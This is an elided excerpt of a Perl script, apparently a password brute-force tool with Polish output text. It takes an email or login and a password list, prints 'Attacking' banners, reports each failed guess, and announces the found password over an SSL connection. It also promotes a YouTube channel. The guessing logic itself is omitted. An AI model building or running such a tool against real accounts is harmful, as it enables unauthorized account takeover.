...
print "\033[1;32m          |+++++++++++++++++++++++++++++++++++++++++++++++++++++++++|\n";
print "\033[1;32m          |=========================================================|\n";
print "\033[1;32m          |   użyj: komendy $0 (Email lub login) hasla.txt |\n";
print "\033[1;32m          |=========================================================|\n";
print "\033[1;32m          |+++++++++++++++++++++++++++++++++++++++++++++++++++++++++|\n";
print "\033[1;32m          |=========================================================|\n";
exit; }
...
print "\n";
print "\033[1;32m         ========================================================\n";
print "\033[1;32m                           Subskrybuj mój kanał:               \n";
print "\033[1;32m             https://www.youtube.com/channel/UCgYKRbjzhpivw8qdKaLiNuA      \n";
print "\033[1;32m         ========================================================\n";

print "\033[1;32m\n [+] Atakuje: $user ... | medota Brute Force.\n\n";
print "==============================================================\n";
...
if (!defined $success)
{
print "\033[1;31m[-] $password ->  Złe, sprawdzam następne... \n";
close SSL;
}
else
{
...
print "\033[1;32m\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n";
print "\033[1;32m\n########################################################\n";
print "[+] \033[1;32m [+] Haslo to: $password\n";
print "\033[1;32m########################################################\n\n";
print "\033[1;32m\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n";
print "\033[1;32m\n########################################################\n";
close SSL;
